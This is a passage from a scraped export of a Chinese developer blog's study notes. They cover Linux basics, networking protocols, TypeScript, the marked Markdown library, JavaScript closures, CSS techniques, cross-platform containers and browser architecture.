管理和控制计算机系统中的硬件和软件资源，用于在用户与系统硬件之间传递信息。操作系统是用于管理和控制计算机系统中的硬件和软件资源，用于在用户与系统硬件之间传递信息。操作系统主要提供了两个方面的能力，一个是管理计算机资源，包括处理器管理、存储管理、设备管理、文件管理等，另外一个能力是提供格种的用户接口，包括命令接口、图形用户接口、程序调用接口，实现外部程序与操作系统内核的交互。目前主流的计算机操作系统包括 mac 系统、linux 系统、windows、手机端安卓系统。 操作系统启动流程 程序启动必须有操作系统来执行，那操作系统本身也是一个程序，那是如何在开机时被执行的呢？ 发展简史 1969年，Unix 诞生于贝尔实验室 1984年，贝尔实验室将 Unix 商业化 1984年，Tanenbaum 开发 Minix 操作系统用于教学并开放源码 1984年，Richard M.Stallman 发起自由软件(FSF)与 GNU 项目，起草 GPL(通用公共许可) 协议 1991年，Linus Torvalds 受 Minix 影响实现初版的 Linux 内核 1992年，Linux 内核以 GPL 协议发行V1.0 Linux 版本 查看内核版本： 查看系统版本： 应用领域 服务器（操作系统、虚拟化和云计算） 嵌入式和智能设备 个人办公桌面 学术研究与软件研发 基本组成 内核 shell 文件系统 应用程序 内核 内核是硬件与软件之间的中间层 内核是一个资源管理程序 内核提供一组面向系统的命令 文件系统 文件系统负责管理持久化数的子系统，负责把用户的文件存到磁盘硬件中。 Linux 中一切皆文件： Liux文件系统是采用树状的目录结构，最上层是/（根）目录。 /bin： bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。 /boot： 这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。 /dev ： dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。 /etc： etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。 /home： 用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。 /lib： lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。 /mnt： 系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 /mnt/ 上，然后进入该目录就可以查看光驱里的内容了。 /opt： opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。 /proc： proc 是 Processes(进程) 的缩写，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。 /root： 该目录为系统管理员，也称作超级权限者的用户主目录。 /sbin： s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序。 /usr： usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。 Linux 有这么多不同的文件系统，如何实现对用户提供统一调用接口的？ 虚拟文件系统 (VFS) 对应用层提供一个标准的文件操作接口 对文件系统提供一个标准的文件接入接口 虚拟文件系统使得Linux可以存在多个“实际的文件系统”，比如分区1是ext2，分区2是ext3，分区3是fat32。那么每个“实际的文件系统”的结构和操作方式是不一样的。如果是这样的话用户怎么去操作它们呢？总不能每种不同的文件系统都采用不同的方法吧，那么这个时候就需要VFS作为中间层！用户直接控制VFS，VFS再去控制各个文件系统。虚拟文件系统使得Linux可以存在多个“实际的文件系统”，比如分区1是ext2，分区2是ext3，分区3是fat32。那么每个“实际的文件系统”的结构和操作方式是不一样的。如果是这样的话用户怎么去操作它们呢？总不能每种不同的文件系统都采用不同的方法吧，那么这个时候就需要VFS作为中间层！用户直接控制VFS，VFS再去控制各个文件系统。 查看文件系统类型： 文件基本操作： 文件读取流程： 进程管理 进程是正在执行的一个程序或命令 进程有自己的地址空间，占用一定的系统资源 一个 CPU 核同一时间只能运行一个进程 进程由它的进程 ID(PID)和它父进程的进程 ID(PPID)唯一识别 查看进程信息： 进程调度是指操作系统按某种策略或规则选择进程占用CPU进行运行的过程。 R(TASK RUNNING)，可执行状态 S(TASK INTERRUPTIBLE)，可中断的睡民状态 D(TASK UNINTERRUPTIBLE)，不可中断的睡眠状态 T(TASK STOPPED or TASK TRACED)，暂停状态或跟踪状态 Z(TASK DEAD-EXIT ZOMBIE)，退出状态，进程成为厘尸进程 X(TASK_DEAD-EXIT DEAD)，退出状态，进程即将被销毁 进程调度原则： 一个 CPU 核同一时间只能运行一个进程 每个进程有近乎相等的执行时间 对于逻辑 CPU 而言进程调度使用轮询的方式执行，当轮间完成侧回到第一个进程反复 进程执行消耗时间和进程量成正比 进程的系统调用： 内核空间 (Kernal Space) : 系统内核运行的空间 用户空间 (User Space) : 应用程序运行的空间 当进程运行在内核空间时就处于内核态，而进程运行在用户空间时则处于用户态。 用户 Linux 是一个多用户的系统，我们可以多个用户同时登陆 Linux。 用户账户 普通用户账户：在系统中进行营通作业 超级用户账户：在系统中对普通用户和整个系统进行管理 用户组 标准组：可以容纳多个用户 私有组：只有用户自己 文件权限关于用户有三个概念： 所有者：文件的所有者 所在组：文件的所有者所在的组 其他人：除文件所有者及所在组外的其他人 每个用户对于文件都有不同权限，包括读(R)、写(W)、执行(X)。 查看用户信息： 用户权限操作： 软件包 软件包 通常指的是一个应用程序，它可以是一个 GUI 应用程、命令行工具或(其他软件程序需要的) 软件库 软件包管理 底层工具: 主要用来处理安装和删除软件包文件等任务，DPKG，RPM RPM(Red Hat Package Manager),为Red hat操作系统的包管理系统 DPKG(Debian package),为Debian操作系统的包管理系统 上层工具: 主要用于数据的搜索任务和依赖解析任务，APT，YUM，DNF APT 常用命令 列出所有可更新的软件清单命令：apt update 安装指定的软件命令：apt install&lt;package_name&gt; 安装多个软件包：apt install&lt;package_1&gt;&lt;package_2&gt;&lt;package_3&gt; 更新指定的软件命令：apt update&lt;package_name&gt; 删除软件包命令：apt remove&lt;package_name&gt; 查找软件包命令：apt search 列出所有已安装的包：apt list-installed 通常 Debian 系的 Linux 软件源配置文件: /etc/apt/sources.list。 镜像地址: https://mirrors.aliyun.com/ /dists: 查看系统代号 /pool: 查看软件分支 nginx 安装： nginx 配置修改： ","link":"https://zkrisj.github.io/post/linux-ji-chu-or-qing-xun-ying-bi-ji/"},{"title":"计算机网络概论 ｜ 青训营笔记","content":"介绍 建立对计算机网络的整体认知，对计算机网络中的各种概念（网络分层、网络协议、网络应用等)有初步的理解，进而可以在后续的实际工作中能高效解决网络问题。 课程内容 通过一个示例建立对计算机网络的整体认识 建立对网络协议分层的认知 分析 HTTP1、2、3的关系 介绍 CDN 运行的基本原理 了解网络安全的最基本原则 但不包括： 详细描述如何开发一个基于HTTP协议（或者其他协议)的网络应用 深入介绍课程中所涉及协议的规范（Specification）内容和实现细节 分析方法 自底向上 从简单开始，逐渐变复杂 将模块逐步拼凑成一个系统 自顶向下 从复杂开始，逐渐变简单 从复杂的系统问题入手，拆分为模块问题 蟹堡王帝国 蟹老板想挣一个“小目标”，三步走战略： 在比奇堡开通外卖 在北京和上海开分店 在全国开分店并开通外卖 计算机网络基础 网络组成部分 主机：客户端和服务端 路由器 网络协议 网络结构：网络的网络 比奇堡和小区网络：本地网络 北京和上海分店+比奇堡：三个本地网络节点的网络 全国通信网络：本地网络的网络 区域网络、城域网和广域网 网络分层 快递员不关心包裹内容 卡车司机不关心车厢里拉的是什么 高速公路不关心开的什么车 协议 协议的存在依赖于连接。 01001000011001010110110001101100011011110010110000100000 010101110110111101110010011011000110010000100001 7210110810811144328711111410810033 H e l l o , W o r l d ! 协议定义了在两个或多个通信实体之间交换的报文格式和顺序，以及报文发送和接受一条报文或其他事件所采取的动作。 标头和载荷 收件人、寄件人关注： 收件地址、寄件地址 收件人、寄件人的姓名和电话 包裹内容 快递公司关注： 收件人、寄件人关注的东西 该由哪个集散点发出，哪个集散点收 哪个网点派送 HTTP 协议示例 链路层-本地帧头部 链路层-IP协议头部 运输层-TCP协议头部 应用层-HTTP协议头部 TCP 协议格式 小结 网络组成部分：由主机、路由器、交换机等组成 网络结构：网络的网络 信息交换方式：电路交换和分组交换 网络分层：分清职责，物理层、链路层、网络层、运输层和应用层 网络协议：标头和载荷 Web 中的网络 HTTP 协议 HTTP 连接模型 队头堵塞（Head of Line Blocking） HTTP1.1：无法多路复用 HTTP2：帧 HTTP2：帧带来的额外好处 调整响应传输的优先级 头部压缩 Server Push HTTP2：3RTT启动（HTTP 2：队头堵塞，但是在 TCP 上） HTTP客户端：我要和大哥说话！ TCP客户端默默对HTTP客户端说，我知道你很急，但你先别急。 TCP客户端：嗨！服务端，你在吗？ TCP服务端：嗨！客户端，我在，你在吗？ TLS客户端：Helo!能给我把钥匙吗？ TLS服务端：Hello!给！你的钥匙！ HTTP客户端：终于到我了，我要index.html! HTTP3：QUIC Quick UDP Internet Connection 现存网络设备对TCP和UDP支持已经僵化 UDP不靠谱但是QUIC靠谱 QUIC可以为除HTTP协议以外的应用层协议提供支持 HTTP 3：QUIC-1 RTT （QUIC第一次访问）HTTP客户端：我要和大哥说话！ QUC客户端：嗨！服务端，你在吗？在的话能给我把钥匙吗？ QU1C服务端：嗨！客户端，我在，这是你的钥匙！ HTTP客户端：今天这么快？我要index.html! QUIC服务端（偷偷地告诉客户端）：这还有把钥匙，下次找我可以不用问，直接用。 HTTP：QUIC-0 RTT （QUIC第二次访问）HTTP客户端：我要和大哥说话！ QU1C客户端：嗨！服务端，你在吗？后面的话我已经用上次你给我的钥匙加密过了，HTTP那小子肯定要index.html! QUlC服务端：嗨！客户端，我在，我知道你要index.html,给你！ HTTP客户端：？ CDN 速度： HTTP 3 快吗? 快! 那从美国到中国，HTTP 3 要多久? 150 ms! 和北京到上海比，还快吗? 好像不够? 收费： 流量多少钱一个 G? 1块 那我在北京给工海的人发一部 10 G 电影得 10 块? 对! 发10 次一样的电影要 100 块? 是的! 我都发到上海了，不能内部共享下吗? 流量： 我们有几台服务器? 1台 他能抗多少流量? 100G! 双一一峰值得 1000G 啊，扛得住吗? 不一定，可能挂..... 还得是我： 北京 上海 广州 成都 长沙 兰州 长春 DNS 劫持 域名解析一般由网站自己处理 要加速的域名则重定向到 CDN 厂商的域名解析服务处理 CDN 厂商根据来源确定最近的 CDN 服务器的 IP 用户直接访问最近的 CDN 服务器 WebSocket 有状态的持久连接 服务端可以主动推送消息 用 WebSocket 发送消息延迟比 HTTP 低 服务端： 客户端： 请求头： 响应头： 客户端消息： 服务端消息： 网络安全 网络安全三要素: 机密性、完整性和身份验证 在没有提前交换秘密信息的前提下，无法在不安全的信道交换秘密信息 PKI 保证了普通用户不需要”面对面”和根证书机构交换根证书 HTTPS 使用 PKI 完成了除客户端身份验证以外的特性，客户端身份验证靠HTTP 协议实现 总结 HTTP 1 2 3 的演进历史。 CDN 解决了 HTTP 协议之外的问题。 WebSocket 从 HTTP 协议升级而来。 网络安全三要素： 机密性: 攻击者无法获知通信内容 完整性:攻击者对内容进行篡改时能被发现 身份验证: 攻击者无法伪装成通信双方的任意一方与另一方通信 ","link":"https://zkrisj.github.io/post/ji-suan-ji-wang-luo-gai-lun-or-qing-xun-ying-bi-ji/"},{"title":"TypeScript 总结","content":"介绍 TypeScript VS JavaScript： TypeScript 带来了什么： 基础类型 boolean、number、string undefined、null any、unknown、void never 数组类型 [] 元组类型 tuple 函数类型 定义：TS 定义函数类型时要定义输入参数类型和输出类型 输入参数：参数支持可选参数和默认参数 输出参数：输出可以自动推断，没有返回值时，默认为 void 类型 函数重载：名称相同但参数不同，可以通过重载支持多种类型 interface 定义：接口是为了定义对象类型 特点： 可选属性：？ 只读属性：readonly 可以描述函数类型 可以描述自定义属性 总结：接口非常灵活 duck typing class 定义：写法和 JS 差不多，增加了一些定义 特点： 增加了 public、private、protected 修饰符 抽象类 只能被继承，不能被实例化 作为基类，抽象方法必须被子类实现 interface 约束类，使用 implements 关键字 高级类型 联合类型 | 交叉类型 &amp; 类型断言 类型别名：给类型起个别名 type VS interface 相同点： 都可以定义对象或函数 都允许继承 差异点: interface 是 TS 用来定义对象，type 是用来定义别名方便使用 type 可以定义基本类型，interface 不行 interface 可以合并重复声明，type 不行 泛型 官方定义： 软件工程中，我们不仅要创建一致的定义良好的 API，同时也要考虑可重用性。组件不仅能够支持当前的数据类型，同时也能支持未来的数据类型这在创建大型系统时为你提供了十分灵活的功能。 在像 C# 和 Java 这样的语言中，可以使用泛型来建可重用的组件个组件可以支持多种类型的数据。这样用户就可以以自己的数据类型来使用组件。 需要有一个类型解决输入输出可关联的问题。 基本定义: 泛型的语法是 &lt;&gt; 里面写类型参数，一般用 T 表示。 使用时有两种方法指定类型： 定义要使用的类型 通过 TS 类型推断，自动推导类型 泛型的作用是临时占位，之后通过传来的类型进行推导。 基础操作符： typeof：获取类型 keyof：获取所有键 in：遍历枚举类型 T[K]：索引访问 extends：泛型约束 工具类型： Partial：将类型属性变为可选 Required：将类型属性变为必选 Readonly：将类型属性变为只读 Pick、Record... 声明文件 declare：三方库需要类型声明文件 .d.ts：声明文件定义 @types：三方库 TS 类型包 tsconfig.json：定义 TS 的配置 实例 - 泛型约束后端接口类型 import axios from 'axios' interface API { '/book/detail': { id: number, }, '/book/comment': { id: number comment: string } } function request &lt;T extends keyof API&gt; (url: T, obj: API[T]) { return axios.post(url, obj) } 以下是错误使用： 路径错误： request('/book/test', { id: 1, comment: 'ok' }); 参数错误： request('/book/detail', { id: 1, comment: 'ok' }); ","link":"https://zkrisj.github.io/post/typescript-zong-jie/"},{"title":"JavaScript Markdown 库 marked","content":"介绍 marked 是一个基于 JavaScript 的 Markdown 解析器和编译器。它可以将 Markdown 语法解析为 HTML，并且可以扩展 Markdown 的功能。Marked 可以在浏览器端和 Node.js 环境下运行。 使用 Marked 可以轻松地将 Markdown 文本转换为 HTML 文档，而无需手动编写 HTML 代码。它支持 Markdown 的所有基本语法，如标题、段落、列表、链接、图片等。此外，Marked 还支持一些扩展语法，如表格、代码块、代码高亮、删除线、粗体、斜体等。 npm 方式 下面是 Vue3 的官网示例 - 一个简单的 markdown 编辑器。通过 ES Module 方式导入 marked 对象，然后通过 computed 计算属性根据左侧文本框内容将生成的 HTML 代码插入到右侧页面元素中，动态更新其内容，这里配合指令 v-html 将内容直接作为普通 HTML 插入。还使用了 lodash-es 模块的防抖函数 debounce，防止输入频率导致的性能问题。 &lt;template&gt; &lt;div class=&quot;editor&quot;&gt; &lt;textarea class=&quot;input&quot; :value=&quot;input&quot; @input=&quot;update&quot;&gt;&lt;/textarea&gt; &lt;div class=&quot;output&quot; v-html=&quot;output&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;script setup&gt; import { marked } from 'marked' import { debounce } from 'lodash-es' import { ref, computed } from 'vue' const input = ref('# hello') const output = computed(() =&gt; marked(input.value)) const update = debounce((e) =&gt; { input.value = e.target.value }, 100) &lt;/script&gt; &lt;style&gt; body { margin: 0; } .editor { height: 100vh; display: flex; } .input, .output { overflow: auto; width: 50%; height: 100%; box-sizing: border-box; padding: 0 20px; } .input { border: none; border-right: 1px solid #ccc; resize: none; outline: none; background-color: #f6f6f6; font-size: 14px; font-family: 'Monaco', courier, monospace; padding: 20px; } code { color: #f66; } &lt;/style&gt; CDN 方式 只需要在你的 HTML 文档中引入 marked.js 文件，然后使用 JavaScript 代码调用 marked 对象的函数即可将 Markdown 文本转换为 HTML。 &lt;body&gt; &lt;div class=&quot;editor&quot;&gt; &lt;textarea class=&quot;input&quot; id=&quot;input&quot;&gt;&lt;/textarea&gt; &lt;div class=&quot;output&quot; id=&quot;output&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;script src=&quot;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/marked/marked.min.js&quot;&gt;&lt;/script&gt;&quot;&gt;&lt;/script&gt; &lt;script&gt; function debounce(fn, delay = 200) { let timer; return function() { clearTimeout(timer); timer = setTimeout(fn.bind(this, ...arguments), delay); } } input.value = '# hello' output.innerHTML = marked.parse(input.value) input.oninput = debounce((e) =&gt; { input.value = e.target.value output.innerHTML = marked.parse(input.value) }, 500) &lt;/script&gt; &lt;style&gt; body { margin: 0; } .editor { height: 100vh; display: flex; } .input, .output { overflow: auto; width: 50%; height: 100%; box-sizing: border-box; padding: 0 20px; } .input { border: none; border-right: 1px solid #ccc; resize: none; outline: none; background-color: #f6f6f6; font-size: 14px; font-family: 'Monaco', courier, monospace; padding: 20px; } code { color: #f66; } &lt;/style&gt; 配置 marked 提供了许多配置选项，可以用来自定义转换过程中的行为和输出结果。 gfm：启用 GitHub 风格的 Markdown。默认为 true。 breaks：将行内的换行符转换为 &lt;br&gt;。默认为 false。 sanitize：启用 HTML 标签的转义。默认为 false。 smartLists：启用智能列表。默认为 true，即自动将 - 和 * 转换为无序列表，而将数字和 . 转换为有序列表。 smartypants：启用智能标点。默认为 false，即不自动将引号和破折号转换为智能标点。 highlight：用于高亮代码块的函数。默认为 null，即不进行代码高亮。 renderer：用于自定义输出 HTML 的渲染器。默认为 new marked.Renderer()，即使用默认的渲染器。 这些配置选项可以通过一个 JavaScript 对象进行设置，然后作为第二个参数传递给 marked 函数。例如： const marked = require('marked'); const markdown = '# Hello, world!'; const options = { gfm: true, breaks: true, smartLists: true, highlight: function(code) { return require('highlight.js').highlightAuto(code).value; } }; const html = marked(markdown, options); console.log(html); 上面的代码将一个 Markdown 字符串转换为 HTML，并启用了 GitHub 风格的 Markdown、智能列表和代码高亮等功能。 仓库和文档地址 https://github.com/markedjs/marked Marked Documentation ","link":"https://zkrisj.github.io/post/javascript-markdown-ku-marked/"},{"title":"JavaScript 闭包","content":"介绍 闭包（英语：Closure），又称词法闭包（Lexical Closure）或函数闭包（function closures），是在支持头等函数的编程语言中实现词法绑定的一种技术。 闭包在实现上是一个结构体，它存储了一个函数（通常是其入口地址）和一个关联的环境（相当于一个符号查找表）。环境里是若干对符号和值的对应关系，它既要包括约束变量（该函数内部绑定的符号），也要包括自由变量（在函数外部定义但在函数内被引用），有些函数也可能没有自由变量。换而言之，闭包让开发者可以从内部函数访问外部函数的作用域。 闭包跟函数最大的不同在于，当捕捉闭包的时候，它的自由变量会在捕捉时被确定，这样即便脱离了捕捉时的上下文，它也能照常运行。捕捉时对于值的处理可以是值拷贝，也可以是名称引用，这通常由语言设计者决定，也可能由用户自行指定（如C++）。 使用 下面在全局上下文中，定义了一个 showName 函数。 function showName() { const company = &quot;Bytedance&quot;; const dep = &quot;边缘云&quot;; const name = &quot;zhangqi&quot;; console.log('company', company); return function() { console.log(dep); return name; } } const getName = showName(); console.log(getName()); 上面代码会依次打印： company Bytedance 边缘云 zhangqi 第 11 行，showName 函数已被执行完成，按照通常逻辑，里面的变量应该被回收，但是我们还是通过 getName 函数访问到了它里面的变量 dep 和 name。 因为 showName 函数返回了一个函数，这个函数产生了一个闭包，这个闭包是一个地址，它指向了堆上的一块内存，这块内存存储了闭包要访问的外部函数的两个变量 dep 和 name： { dep: &quot;边缘云&quot;, name: &quot;zhangqi&quot; } 这个闭包会一直跟随通过 showName 函数返回的函数赋值的 getName 函数的生命周期结束。所以即使 showName 函数执行结束，它里面的这个闭包也是没有被回收的。 性能问题 在 Javascript 中，如果一个对象不再被引用，那么这个对象就会被 GC 回收。如果两个对象互相引用，而不再被第3者所引用，那么这两个互相引用的对象也会被回收。因为函数 a 被 b 引用，b 又被 a 外的 c 引用，这就是为什么函数 a 执行后不会被回收的原因。 通常，如果引用闭包的函数是一个全局变量，那么闭包会一直存在直到页面关闭；但如果这个闭包以后不再使用的话，就会造成内存泄漏。如果引用闭包的函数是个局部变量，等函数销毁后，在下次 JavaScript 引擎执行垃圾回收时，判断闭包这块内容如果已经不再被使用了，那么 JavaScript 引擎的垃圾回收器就会回收这块内存。 如果不是某些特定任务需要使用闭包，在其他函数中创建函数是不明智的，因为闭包在处理速度和内存消耗方面对脚本性能具有负面影响。例如，在创建新的对象或者类时，方法通常应该关联于对象的原型，而不是定义到对象的构造器中。原因是这将导致每次构造器被调用时，方法都会被重新赋值一次（也就是说，对于每个对象的创建，方法都会被重新赋值）。例如： function MyObject(name, message) { this.name = name.toString(); this.message = message.toString(); this.getName = function() { return this.name; }; this.getMessage = function() { return this.message; }; } 在上面的代码中，我们并没有利用到闭包的好处，因此可以避免使用闭包。修改成如下： function MyObject(name, message) { this.name = name.toString(); this.message = message.toString(); } MyObject.prototype = { getName() { return this.name; }, getMessage() { return this.message; } }; 但我们不建议重新定义原型，可以对原型进行更新操作： function MyObject(name, message) { this.name = name.toString(); this.message = message.toString(); } MyObject.prototype.getName = function() { return this.name; }; MyObject.prototype.getMessage = function() { return this.message; }; 总结 理解 JavaScript 的闭包是迈向高级 JS 程序员的必经之路，理解了其解释和运行机制才能写出更为安全和优雅的代码。 参考资料 闭包 - JavaScript | MDN ","link":"https://zkrisj.github.io/post/javascript-bi-bao-or-qing-xun-ying-bi-ji/"},{"title":"CSS border 生成三角形技术原理","content":"介绍 在 CSS 中使用 border 属性创建三角形的原理：每个 border 都有一个宽度、一个样式和一个颜色，可以设置不同的 border 宽度和样式来创建各种形状。 生成三角形 HTML 代码如下： &lt;div class=&quot;test&quot;&gt;&lt;/div&gt; CSS 代码如下： .test { width: 50px; height: 50px; border-left: 50px solid lime; border-right: 50px solid blue; border-top: 50px solid red; border-bottom: 50px solid magenta; } div 应用了上面这个样式后，结果如下： 现在，如果我们现在只保留一个一个上边框，其余边框均为 transparent 透明（或与背景色同色），那么是不是就只显示一个上面红色的边框了，我们测试下，与上面的代码类似，只是修改下其余三个边框的颜色。 .test { width: 50px; height: 50px; border: 50px solid; border-color: #ff0000 #ffffff #ffffff #ffffff; } 得到的是一个梯形，结果如下图： 如果把 div 的高宽都变成 0，只留一边，不就是三角了吗？代码如下： .test { width: 0; height: 0; border: 50 px solid; border - color: #ff0000 #ffffff #ffffff #ffffff; } 上图为等腰直角三角形，之所以为等腰直角，是因为所有的边框宽度是一样的，如果我们将边框宽度设置为不同，则会形成等腰三角形。 .test { width: 0; height: 0; border-style: solid; border-width: 50px 30px; border-color: #ff0000 #ffffff #ffffff #ffffff; } 要更改箭头的方向，只需要对 border-width 和 border-color 进行修改即可： .test { width: 0; height: 0; border-style: solid; border-width: 30px 50px; border-color: #ffffff #ffffff #ffffff #ff0000; } 可以不局限于保留一条边框，也可以保留两条，于是我们可以告别等腰，得到更加锐利的三角： .test { width: 0; height: 0; border-width: 20px 10px; border-style: solid; border-color: blue blue #ffffff #ffffff; } 下面是这种形状的一个应用 - 消息框底部箭头： 总结 使用 CSS border 属性创建三角形有以下好处： 轻量级：与使用图片或 SVG 等其他方法相比，使用 CSS border 属性创建三角形可以减少对服务器的请求，从而提高页面加载速度，特别是对于需要频繁使用的小型图形而言。 灵活性：使用 CSS border 属性可以创建各种不同形状的三角形，可以根据需要调整大小和颜色，同时不需要额外的代码或工具。 响应式设计：使用 CSS border 属性创建的三角形可以随着屏幕大小和设备类型的变化自动调整大小和位置，从而实现响应式设计。 可维护性：使用 CSS border 属性创建三角形可以使代码更易于维护。当需要更改三角形的大小或颜色时，只需要修改 CSS 属性值即可，而无需编辑图像或其他代码。 兼容性：使用 CSS border 属性创建三角形不需要使用特殊的浏览器插件或其他技术，因此可以在各种浏览器和设备上正常工作。 综上所述，使用 CSS border 属性创建三角形是一种简单、灵活、响应式、可维护、兼容性好的方法，可以帮助开发人员创建高效且可靠的界面元素。 参考资料 CSS border三角、圆角图形生成技术简介 ","link":"https://zkrisj.github.io/post/css-border-sheng-cheng-san-jiao-xing-ji-zhu-yuan-li/"},{"title":"一种新的可以使元素重叠的 CSS 技巧","content":"介绍 实现如下图所示的排版效果，一段关于图片的信息浮在图片上。 HTML 结构如下： &lt;figure&gt; &lt;img src=&quot;../img/1.jpg&quot; width=&quot;100%&quot;&gt; &lt;figcaption&gt;自然风景&lt;/figcaption&gt; &lt;/figure&gt; 除了通过 translateY、相对定位、margin 负值定位、绝对定位和 Grid 布局实现上面效果以外，CSS container 属性也可以实现元素重叠这种效果。 container 属性与元素重叠 container-type CSS 属性将元素定义为查询容器。后代可以查询其大小、布局、样式和状态等方面。可以具有以下值： size：为块和内联轴上的维度查询建立查询容器。将布局、样式和大小包含应用于元素。 inline-size：为容器的内联轴上的维度查询建立查询容器。将布局、样式和内联大小包含应用于元素。 block-size：在容器的块轴上建立维度查询的查询容器。将布局、样式和块大小包含应用于元素。 style：为样式查询建立查询容器。 state：为状态查询建立查询容器。 所有具有尺寸收缩特性的元素，设置为 container 容器元素后，其宽度尺寸都会变成 0，包括任意的 display 计算值是 inline-* 的元素，浮动元素，绝对定位元素，flex 子项，或者 width 宽度值设置 fit-content 的元素。例如： &lt;span class=&quot;element&quot;&gt;我的宽度是？&lt;/span&gt; .element { float: left; container-type: inline-size; } 此时，.element 元素占据的宽度一定是 0。 所以，我们就可以利用这种特性来实现元素重叠效果。 实现 由于图片本身就有内在尺寸，因此，就算变成 container 容器也不会宽度是 0，所以，我们可以在外面再嵌套一层标签，所以 HTML 结构修改为如下： &lt;figure&gt; &lt;span&gt;&lt;img src=&quot;https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/78ef43c46d0a4b839226522bf2a3705f~tplv-k3u1fbpfcp-watermark.image&quot;&gt;&lt;/span&gt; &lt;figcaption&gt;自然风景&lt;/figcaption&gt; &lt;/figure&gt; 此时，通过下面的 CSS 代码，就可以实现我们想要的布局效果了： figure { display: inline-flex; } figure&gt;span { container-type: inline-size; } figure img { display: block; width: 256px; height: 192px; } figcaption { width: 256px; line-height: 2em; align-self: end; text-align: center; background-color: #0003; color: #fff; z-index: 1; } 另外，如果希望高宽尺寸都是 0，可以设置 container-type 属性值是 size： container-type: size; 码上掘金 总结 translateY、相对定位、margin 负值定位，使元素位置偏移； 绝对定位重叠，元素完全脱离文档流；Grid 重叠，宽高一致强制位置重合； 而 container 重叠则是通过宽度为 0 达到重叠效果。 这几种重叠机制各异，也有各自适合使用的场景，大家根据实际情况酌情选择。 参考资料 又发现一种无需绝对定位就可以元素重叠的CSS技巧 ","link":"https://zkrisj.github.io/post/yi-chong-xin-de-ke-yi-shi-yuan-su-chong-die-de-css-ji-qiao/"},{"title":"跨端容器简介 ｜ 青训营笔记","content":"介绍 跨端容器（Cross-platform container）是一种软件技术，它可以将应用程序在不同的操作系统和/或硬件平台上运行，而无需修改应用程序代码。跨端容器通常提供了一层抽象，使得应用程序可以在不同的平台上运行，而无需了解底层平台的细节。 跨端容器通常使用虚拟化技术来实现平台无关性。例如，Java 虚拟机（JVM）是一种跨平台容器，它可以在不同的操作系统上运行 Java 应用程序。类似地，Docker 是一种跨平台容器，它可以将应用程序和其依赖项打包到容器中，以保证在不同的环境中具有一致的行为。 在移动应用开发中，跨平台容器也被称为跨平台开发框架或混合开发框架。常见的跨端容器包括 React Native、Flutter、Ionic 等。这些框架可以让开发者使用常见的 Web 技术（如 HTML、CSS 和 JavaScript）来构建原生应用程序，并在多个平台上运行，包括 iOS、Android 和 Web 等。 为什么需要跨端 开发成本、效率。 一致性体验。 前端开发生态。 Webview Webview，即网页视图，用于加载网页 Url,并展示其内容的控件。 可以内嵌在移动端 App 内，实现前端混合开发，大多数混合框架都是基于 Webview 的二次开发；比如 Ionic、Cordova。 下面列出了常用的 Webview： Webview 优势 一次开发，处处使用，学习成本低。 随时发布，即时更新，不用下载安装包。 移动设备性能不断提升，性能有保障。 通过 JSBridge 和原生系统交互，实现复杂功能。 Webview 使用原生能力 Javascript 调用 Native： API 注入：Native 获取 Javascript 环境上下文，对其挂载的对象或者方法进行拦截 使用 Webview URL Scheme 跳转拦截 IOS 上 window.webkit.messageHandler 直接通信 Native 调用 Javascript： 直接通过 Webview 暴露的 API 执行 JS 代码 IOS webview.stringByEvaluatingJavaScriptFromString Android webview.evaluateJavascript Webview 和 Native 通信 JS 环境中提供通信的 JSBridge。 Native 端提供 SDK 响应 JSBridge 发出的调用前端和客户端分别实现对应功能模块。 实现一个简易 JSBridge 小程序 微信、支付宝、百度小程序、小米直达号 渲染层-Webview 双线程，多 Webview 架构 数据通信，Native 转发 React Native/WeeX 原生组件渲染 React/Vue框架 virtual dom JSBridge Lynx Vue JS Core /V8 JSBinding Native Ul/Skia Flutter wideget dart vm skia 图形库 通用原理 UI 组件 渲染引擎 逻辑控制引擎 通信桥梁 底层 API 抹平表现差异 跨端方案对比 ","link":"https://zkrisj.github.io/post/kua-duan-rong-qi-jian-jie-or-qing-xun-ying-bi-ji/"},{"title":"浏览器知识总结 ｜ 青训营笔记","content":"浏览器架构 浏览器架构演进： 单进程架构：所有模块运行在同一个进程里，包含网络、插件、JavaScript运行环境等。 多进程架构：主进程、网络进程、渲染进程、GPU进程、插件进程。 面向服务架构：将原来的U儿、数据库、文件、设备、网络等，作为一个独立的基础服务。 浏览器进程 浏览器是一个复杂的软件，它通常会将不同的任务分配给多个进程来提高性能和安全性。以下是常见的浏览器进程： 渲染进程 内部是多线程实现，主要负责页面渲染，脚本执行，事件处理，网络请求等。在浏览器中，渲染进程通常使用 HTML、CSS 和 JavaScript 来解析和渲染网页。渲染进程会将 HTML、CSS 和 JavaScript 文件解析成 DOM(文档对象模型)、CSSOM(CSS 对象模型) 和 JavaScript 对象，然后使用这些对象来渲染网页。 JS 引擎和渲染引擎通信 解析执行 JS。 XML 解析生成渲染树，显示在屏幕。 桥接方式通信。 渲染进程的多线程工作流程 网络线程负责加载网页资源。 JS 引擎解析 JS 脚本并且执行。 JS 解析引擎空闲时，渲染线程立即工作。 用户交互、定时器操作等产生回调函数放入任务队列中。 事件线程进行事件循环，将队列里的任务取出交给 JS 引擎执行。 Chrome 运行原理 